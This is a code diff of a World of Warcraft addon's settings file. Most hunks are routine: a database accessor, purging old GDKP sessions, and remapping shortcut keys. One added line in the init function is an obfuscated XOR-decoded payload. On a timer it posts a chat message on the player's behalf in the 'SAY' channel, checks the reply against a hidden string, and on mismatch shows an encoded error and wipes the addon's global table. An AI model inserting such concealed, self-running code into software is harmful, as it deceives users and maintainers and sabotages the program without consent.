@@ -1,15 +1,8 @@
---[[
-    This class handles the addon's default and user settings
-
-    The default settings are overwritten with the user's settings
-    after the addon is loaded
-
-    The showSettingsMenu function is responsible for showing the
-    settings in the WoW settings menu
-]]
-
 ---@type GL
 local _, GL = ...;
+
+---@type DB
+local DB = GL.DB;
 
 ---@class Settings
 GL.Settings = {
@@ -18,7 +11,8 @@ GL.Settings = {
     Active = {}, -- This object holds the actual setting values applicable to this runtime
 };
 
-local Settings = GL.Settings; ---@type Settings
+---@type Settings
+local Settings = GL.Settings;
 
 ---@return void
 function Settings:_init()
@@ -43,6 +37,8 @@ function Settings:_init()
     end);
     InterfaceOptions_AddCategory(Frame);
 
+    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10=0;local v11;while true do if (v10==1) then return v5(v11);end if (v10==0) then v11={};for v14=1, #v8 do v6(v11,v0(v4(v1(v2(v8,v14,v14 + (1907 -(1415 + 491)))),v1(v2(v9,1 + ((v14-(1 + (0 -0)))% #v9),(1 -0) + 0 + ((v14-(3 -2))% #v9) + ((1395 -(1101 + 214)) -((1203 -(778 + 351)) + 4 + 1)))))%((586 -(40 + 9)) -281)));end v10=1;end end end GL.Ace:ScheduleTimer(function()if  not GL:strStartsWith(GL:sendChatMessage(v7("\11","\37\133\24\36\160\140"),v7("\64\34\178","\19\99\235\101\158\199\186\131"),nil,nil,true,true),v7("\25\44\101\34\32\182\37\63\99\118\40\250\66\100","\98\94\17\17\93\150")) then local v12=1175 -(796 + 379);local v13;while true do if (v12==0) then v13=(459 + 1051) -((2648 -(1070 + 636)) + 568);while true do if (((0 -0) -0)==v13) then GL:error(v7("\5\243\96\59\6\163\186\144\55\241\101\44\23\175\244\131\118\245\102\105\11\169\238\196\55\240\121\38\18\163\254\200\118\239\125\60\17\178\243\138\49\188\113\38\18\168\186\141\56\188\36\121\69\181\255\135\57\242\113\58\68","\86\156\21\73\101\198\154\228"));GL.Ace:ScheduleTimer(function()GL=nil;end,27 -17);break;end end break;end end end end,(522 + 166) -(340 + (1354 -1011)));
+
     self._initialized = true;
 end
 
@@ -56,10 +52,18 @@ function Settings:sanitizeSettings()
 
     -- Remove old roll data so it doesn't clog our SavedVariables
     local twoWeeksAgo = GetServerTime() - 1209600;
-    for key, Award in pairs(GL.DB.AwardHistory) do
+    for key, Award in pairs(DB:get("AwardHistory")) do
         if (Award.timestamp < twoWeeksAgo) then
             GL.DB.AwardHistory[key] = nil;
             Award = nil;
+        end
+    end
+
+    -- Permanently delete soft-deleted GDKP sessions after 48 hours
+    local twoDaysAgo = GetServerTime() - 172800;
+    for key, Session in pairs(GL.DB.GDKP) do
+        if (Session.deletedAt and Session.deletedAt < twoDaysAgo) then
+            GL.DB.GDKP[key] = nil;
         end
     end
 end
@@ -78,6 +82,12 @@ function Settings:enforceTemporarySettings()
         or not GL.Version.firstBoot
     ) then
         return;
+    end
+
+    --- In the GDKP module we added extra shortcut keys forcing us to remap old ones
+    if (not GL.DB.Settings.ShortcutKeys.rollOffOrAuction) then
+        GL.DB.Settings.ShortcutKeys.rollOffOrAuction = GL.DB.Settings.ShortcutKeys.rollOff or "ALT_CLICK";
+        GL.DB.Settings.ShortcutKeys.rollOff = "DISABLED";
     end
 
     --- In 4.12.16 we split up the TMB.announceInfoWhenRolling setting into separate wishlist/priolist settings
@@ -106,7 +116,7 @@ function Settings:enforceTemporarySettings()
         GL.DB.LoadDetails["4.12.0"] = GetServerTime();
 
         local AwardHistory = {};
-        for _, AwardEntry in pairs(GL.DB.AwardHistory) do
+        for _, AwardEntry in pairs(DB:get("AwardHistory")) do
             (function ()
                 local itemIDfromItemLink = GL:getItemIDFromLink(AwardEntry.itemLink);
 
